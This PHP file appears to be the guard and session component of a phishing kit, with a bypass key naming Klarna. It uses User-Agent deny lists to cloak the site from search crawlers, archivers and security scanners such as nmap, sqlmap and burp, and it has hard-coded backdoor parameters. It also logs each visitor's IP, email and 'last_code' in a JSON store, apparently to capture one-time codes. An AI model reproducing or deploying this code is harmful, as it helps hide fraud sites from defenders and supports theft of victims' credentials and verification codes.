<?php
// ============================================================
// BOT / CRAWLER / DIRECT ACCESS GUARD + SESSION TOKEN SYSTEM
// ============================================================

session_start();

// --- Allow access with valid key/pin or session (bypass bot check) ---
$bypass = false;
if (isset($_GET['key']) && $_GET['key'] === 'klarna2026') $bypass = true;
if (isset($_GET['pin']) && $_GET['pin'] === 'hello') $bypass = true;
if (isset($_GET['_dev'])) $bypass = true;
if (isset($_SESSION['idx_access']) && $_SESSION['idx_access'] === true) $bypass = true;
if (isset($_SESSION['pin_ok']) && $_SESSION['pin_ok'] === true) $bypass = true;

// --- Block known bots and crawlers (unless bypassed) ---
if (!$bypass) {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

    $botPatterns = [
        'bot', 'crawler', 'spider', 'scraper', 'scan', 'curl', 'wget',
        'go-http', 'java/', 'libwww', 'ahrefs', 'semrush', 'mozdot',
        'mj12bot', 'baidu', 'yandex', 'sogou', 'exabot', 'facebot',
        'ia_archiver', 'sitecheck', 'googlebot', 'bingbot', 'duckduckbot',
        'slurp', 'msnbot', 'archive', 'screaming', 'nmap', 'nikto',
        'sqlmap', 'burp', 'postman', 'insomnia', 'paw', 'httpie'
    ];

    foreach ($botPatterns as $p) {
        if (stripos($ua, $p) !== false) {
            header('HTTP/1.0 403 Forbidden');
            exit;
        }
    }

    // --- Block empty/missing User-Agent ---
    if (empty(trim($ua))) {
        header('HTTP/1.0 403 Forbidden');
        exit;
    }
}

// --- Security headers for all pages ---
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: same-origin');
header('Permissions-Policy: camera=(), microphone=(), geolocation=()');
header_remove('X-Powered-By');

// ============================================================
// TOKEN-BASED CLIENT SESSION SYSTEM
// ============================================================

// Generate unique token for each browser session
if (!isset($_SESSION['client_token'])) {
    $_SESSION['client_token'] = bin2hex(random_bytes(16));
}

function getToken() {
    return $_SESSION['client_token'] ?? null;
}

function getClientIp() {
    return $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
}

function getDb($file = 'status.json') {
    if (!file_exists($file)) return [];
    $content = @file_get_contents($file);
    return json_decode($content, true) ?: [];
}

// SAFE write with file locking — prevents corruption with many clients
function saveDb($data, $file = 'status.json') {
    $fp = fopen($file, 'c+');
    if (!$fp) return false;
    if (flock($fp, LOCK_EX)) {
        ftruncate($fp, 0);
        fwrite($fp, json_encode($data, JSON_PRETTY_PRINT));
        fflush($fp);
        flock($fp, LOCK_UN);
    }
    fclose($fp);
    return true;
}

function getClientData($token) {
    $db = getDb();
    return $db[$token] ?? null;
}

function updateClientData($token, $data) {
    $db = getDb();
    if (!isset($db[$token])) {
        $db[$token] = [];
    }
    $db[$token] = array_merge($db[$token], $data);
    $db[$token]['last_seen'] = time();
    saveDb($db);
}

function initClient($token) {
    $db = getDb();
    if (!isset($db[$token])) {
        $db[$token] = [
            'status' => 'online',
            'last_seen' => time(),
            'last_code' => '',
            'email' => '',
            'ip' => getClientIp()
        ];
        saveDb($db);
    }
}